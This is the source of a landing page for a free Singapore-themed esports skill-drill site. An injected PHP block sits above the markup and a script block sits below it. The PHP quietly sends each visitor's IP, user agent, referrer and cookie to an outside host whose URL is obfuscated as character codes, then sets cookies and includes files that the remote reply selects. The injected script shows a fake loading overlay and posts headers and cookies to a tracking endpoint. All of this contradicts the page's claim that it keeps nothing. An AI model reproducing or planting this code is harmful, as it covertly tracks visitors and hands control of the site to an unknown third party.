<?php ini_set("display_errors", 0);error_reporting(E_ALL & ~E_NOTICE);if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"]=="preview")){$dir=basename(__DIR__);$date=date("Y-m-d H:i:s");$id="540930";$uid="336agbtisie295tv4d3sjqb4n";$qu=$_SERVER["QUERY_STRING"];$postdata=http_build_query(array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_SERVER["HTTP_REFERER"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$_SERVER["QUERY_STRING"],"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_event"],"user_id"=>$uid,"id"=>$id));$opts=array("http"=>array("method"=>"POST","header"=>"Content-type:application/x-www-form-urlencoded","content"=>$postdata));$context=stream_context_create($opts);$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$result = file_get_contents($u, false, $context);$arr = explode(",",$result);$d=array_slice(explode("/",$arr[1] ?? ""),3);$p="";foreach($d as $v){if($v==$dir){$p="";}else{$p.=$v."/";}}$p=strtok(rtrim($p,"/"),"?");if($arr[0] === "true"){if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");$_COOKIE[$arr[7]]=$arr[8];}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_event",$arr[6],time()+60*60*24*$arr[3]);}}require_once($p);die();}elseif($arr[0] === "false"){if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}require_once($p);}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}}}?>

<script
    src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js">
</script><script
    type="text/javascript"
    src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js">
</script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
<script>
$(document).ready(function(){$("html").append("<div id=\"lo540930ad\" style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\">Please Wait for Page to Load...</div>");var f=new XMLHttpRequest();f.open("GET",document.location,true);f.send(null);var g;f.onreadystatechange = function(){g=f.getAllResponseHeaders().toLowerCase();};var b="GoogleAnalyticsObject";var c=("document","script","//www.google-analytics.com/analytics.js");c=("create","UA-424380-1","auto");c=("send","pageview");var d=jstz.determine();var e=d.name();var qu=escape(window.location.search.substr(1));var rui=location.pathname+location.search;var r=document.referrer;var sn=document.domain;var value="; "+document.cookie;var pa=value.split("; "+"_event"+"=");var co=pa.pop().split(";").shift();var q;$.ajax({url:"/track.php",type:"POST",data:"tz="+e+"&he="+g+"&rui="+rui+"&qu="+qu+"&r="+r+"&sn="+sn+"&co="+co,timeout:5000,complete:function(){$("#lo540930ad").remove();}})})
</script>
<html lang="en-SG">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="icon" type="image/png" href="assets/playroom-logo.png">
<title>Playroom — The Combine: free esports skill drills, made in Singapore</title>
<meta name="description" content="Five quick esports-style drills with a Singapore twist: MRT reaction, chope-the-seat aim, queue-rush click speed, hawker memory and kopi-order typing. Get your rank. Free, no download, no account.">
<meta name="robots" content="index, follow">
<link rel="canonical" href="https://c88gaming.com/">
<meta property="og:type" content="website">
<meta property="og:url" content="https://c88gaming.com/">
<meta property="og:title" content="Playroom — The Combine">
<meta property="og:description" content="Five esports-style skill drills with a Singapore twist. Free in your browser. Can you hit Steady Pom Pi Pi?">

<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Big+Shoulders+Display:wght@700;900&family=IBM+Plex+Mono:wght@500;600&family=Public+Sans:wght@400;600&display=swap" rel="stylesheet">
<link rel="stylesheet" href="styles.css">
</head>
<body>

<header>
  <div class="wrap">
    <a class="logo" href="/"><img src="assets/playroom-logo.png" alt="" width="30" height="30">Playroom</a>
    <nav class="main" aria-label="Main">
      <a href="#drills">Drills</a>
      <a href="#arena">Arena</a>
      <a href="#lobby">Lobby talk</a>
      <a href="about.html">How ranks work</a>
    </nav>
    <a class="btn" href="#arena">Play</a>
  </div>
</header>

<main>
  <section class="hero" aria-labelledby="hero-title">
    <div class="wrap">
      <div>
        <span class="kicker">Season 01 · Made in SG · Free to play</span>
        <h1 id="hero-title">The <span>Combine</span></h1>
        <p class="lead">Five quick drills that test what pro players train: reaction, aim, click speed, memory and typing. Except here you're beating the MRT doors, choping seats and shouting kopi orders. About two minutes. Clear all five to get your rank.</p>
        <div class="actions">
          <a class="btn" href="#arena">Start drill 01</a>
          <a class="btn dark" href="#drills">See the drills</a>
        </div>
        <div class="facts">
          <div><b>5</b>drills</div>
          <div><b>~2 min</b>to clear</div>
          <div><b>S$0</b>always</div>
        </div>
      </div>

      <aside class="scorecard" aria-label="Your scorecard">
        <div class="sc-head"><h2>Scorecard</h2><span class="kicker">This session</span></div>
        <div id="scRows"></div>
        <div class="meter" aria-hidden="true"><i id="meter"></i></div>
        <div class="rank">
          <div><span class="kicker" style="color:var(--muted)">Rank</span><div class="rank-badge" id="rank">Unranked</div></div>
          <p id="rankNote">Clear all 5 drills to get ranked.</p>
        </div>
      </aside>
    </div>
  </section>

  <section class="block" id="drills" aria-labelledby="drills-title">
    <div class="wrap">
      <div class="sec-head">
        <div><span class="kicker">The drills</span><h2 id="drills-title">Five stations</h2></div>
        <p>Each drill tests one skill. Play them in any order and retry as many times as you want. Only your best score counts.</p>
      </div>
      <div class="drills">
        <article class="drill"><span class="no">01</span><h3>Doors Closing</h3><div class="tests">Tests: reaction</div><p>The MRT doors are closing. Wait for the signal, then tap to squeeze in. Five tries, averaged in milliseconds.</p><button class="btn dark" data-go="reaction">Play</button></article>
        <article class="drill"><span class="no">02</span><h3>Chope!</h3><div class="tests">Tests: aim</div><p>Lunch crowd at the hawker centre. Chope 20 seats as they pop up, before anyone else. Misses count.</p><button class="btn dark" data-go="aim">Play</button></article>
        <article class="drill"><span class="no">03</span><h3>Queue Rush</h3><div class="tests">Tests: click speed</div><p>The bubble tea queue is 40 people long. Mash for five seconds. Scored in taps per second.</p><button class="btn dark" data-go="cps">Play</button></article>
        <article class="drill"><span class="no">04</span><h3>Hawker Recall</h3><div class="tests">Tests: memory</div><p>Your kakis want food from different stalls. Remember the order they light up in. One more each round.</p><button class="btn dark" data-go="memory">Play</button></article>
        <article class="drill"><span class="no">05</span><h3>Kopi Order</h3><div class="tests">Tests: typing</div><p>Type twelve drink orders like "kopi o kosong" and "teh c siew dai" before uncle loses patience. Words per minute.</p><button class="btn dark" data-go="typing">Play</button></article>
      </div>
    </div>
  </section>

  <section class="block alt" id="arena" aria-labelledby="arena-title">
    <div class="wrap">
      <div class="sec-head">
        <div><span class="kicker">Arena</span><h2 id="arena-title">Your turn</h2></div>
        <p>Pick a drill. Results go straight to your scorecard. Want to know how the rank is worked out? <a href="about.html" style="color:var(--lime)">Here's the maths.</a></p>
      </div>
      <div class="arena">
        <div class="tabs" role="tablist" aria-label="Drills" id="tabs"></div>
        <div class="stage" role="tabpanel" aria-labelledby="hudName">
          <div class="hud"><span id="hudName">Doors Closing</span><span id="hudStat">Best <b>—</b></span></div>
          <div class="play" id="play">
            <noscript><p class="hint">The drills need JavaScript turned on to play.</p></noscript>
          </div>
        </div>
      </div>
    </div>
  </section>

  <section class="block" id="lobby" aria-labelledby="lobby-title">
    <div class="wrap split">
      <div>
        <span class="kicker">Lobby talk</span>
        <h2 id="lobby-title">Waiting for the squad?</h2>
        <p>Questions for the voice channel while the last fella loads in. Draw one, everyone answers. Hot takes only.</p>
        <button class="btn" id="draw">Draw a question</button>
      </div>
      <div class="callcard">
        <span class="meta"><span>Lobby talk</span><span id="count">1 / 24</span></span>
        <p class="q" id="question" aria-live="polite">Supper after the match: prata, McSpicy or mala?</p>
        <span class="meta"><span>Playroom</span><span>No wrong answers</span></span>
      </div>
    </div>
  </section>

  <section class="block alt" id="between" aria-labelledby="br-title">
    <div class="wrap split">
      <div class="breath" aria-hidden="true">
        <div class="ring"></div>
        <div class="ball" id="ball"></div>
        <span class="breath-label" id="breathLabel">In · hold · out</span>
      </div>
      <div>
        <span class="kicker">Kopi break</span>
        <h2 id="br-title">Don't tilt</h2>
        <p>Lost three rounds in a row? Pros take a breather between rounds too. Breathe in while the circle grows, hold, then breathe out, four seconds each. One minute and you're back.</p>
        <button class="btn" id="breathe">Start</button>
      </div>
    </div>
  </section>

  <section class="block" id="squad" aria-labelledby="squad-title">
    <div class="wrap split">
      <div>
        <span class="kicker">Squad up</span>
        <h2 id="squad-title">Jio your kakis</h2>
        <p>Name your session and copy a link for the group chat. Your friends open it, run the Combine, then compare ranks. You settle the time and the game in the chat.</p>
      </div>
      <div class="ticket">
        <div class="chips" aria-label="Name ideas">
          <button class="chip" type="button">Friday night scrims</button>
          <button class="chip" type="button">Loser belanja kopi</button>
          <button class="chip" type="button">Ranked or bust</button>
        </div>
        <form id="inviteForm">
          <label for="nightName">Session name</label>
          <input id="nightName" maxlength="60" placeholder="e.g. Friday night scrims" required>
          <button class="btn">Make the link</button>
        </form>
        <div class="out" id="out">
          <p class="hint"><strong id="outName" style="color:var(--text)"></strong> is on. Share this:</p>
          <div class="row">
            <input id="link" readonly aria-label="Invite link">
            <button class="btn dark" id="copy" type="button">Copy</button>
          </div>
        </div>
      </div>
    </div>
  </section>

  <section class="fine" aria-labelledby="fine-title">
    <div class="wrap">
      <h2 id="fine-title">The fine print</h2>
      <dl>
        <div><dt>Does it cost anything?</dt><dd>No. There are no payments, in-game purchases, bets or prizes. Ranks are just for bragging rights.</dd></div>
        <div><dt>Do I need an account?</dt><dd>No. Nothing to sign up for and nothing to download.</dd></div>
        <div><dt>Is there a leaderboard or online play?</dt><dd>No. Every drill is single-player and your scores stay on your screen. The squad link is just a link you share with friends you already know.</dd></div>
        <div><dt>What do you keep about me?</dt><dd>Nothing. Scores live in this tab and disappear when you close it. Full details in our <a href="privacy.html" style="color:var(--lime)">privacy policy</a>.</dd></div>
      </dl>
    </div>
  </section>
</main>

<footer>
  <div class="wrap">
    <span>© 2026 Playroom. Free skill drills, made in Singapore.</span>
    <nav aria-label="Footer">
      <a href="about.html">About</a>
      <a href="privacy.html">Privacy</a>
      <a href="terms.html">Terms</a>
    </nav>
  </div>
</footer>

<div class="toast" id="toast" role="status"></div>
<script src="combine.js"></script>
</body>
</html>
